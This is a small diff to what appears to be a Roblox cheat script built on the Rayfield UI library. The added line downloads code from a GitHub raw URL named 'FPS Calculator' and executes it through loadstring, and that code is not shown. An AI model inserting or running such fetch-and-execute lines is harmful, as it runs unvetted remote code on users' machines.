@@ -1,4 +1,5 @@
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/vuthang28012014-ctrl/Shawarma-kiosk-script-D/refs/heads/main/FPS%20Calculator'))()
 local Player = game:GetService("Players")
 local Localplayer = Player.LocalPlayer
 local executor = "Unknown"
